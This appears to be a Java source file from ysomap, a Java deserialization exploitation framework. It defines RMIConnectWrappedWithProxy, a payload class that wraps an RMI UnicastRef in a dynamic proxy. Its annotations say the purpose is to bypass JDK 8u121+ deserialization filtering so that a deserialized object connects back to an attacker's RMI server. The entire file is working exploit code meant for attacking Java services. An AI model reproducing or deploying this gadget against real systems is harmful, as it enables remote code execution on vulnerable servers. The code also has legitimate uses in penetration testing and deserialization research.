package ysomap.core.gadget.payload.rmi;

import sun.rmi.server.UnicastRef;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Payloads;
import ysomap.annotation.Require;

import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;

/**
 * @author wh1t3P1g
 * @since 2020/2/26
 */
@Payloads
@Require(bullets = {"RMIConnectBullet"})
@Dependencies({"using to bypass jdk>=8u121","wrapped with Dynamic Proxy"})
@Authors({ Authors.WH1T3P1G })
public class RMIConnectWrappedWithProxy extends RMIConnectWrapped {

    @Override
    public Remote pack(Object obj) throws Exception {
        return (Remote) Proxy.newProxyInstance(
                RemoteRef.class.getClassLoader(),
                new Class<?>[] { Remote.class }, // RMIServerSocketFactory.class , Activation.class
                new RemoteObjectInvocationHandler((UnicastRef) obj));
    }
}
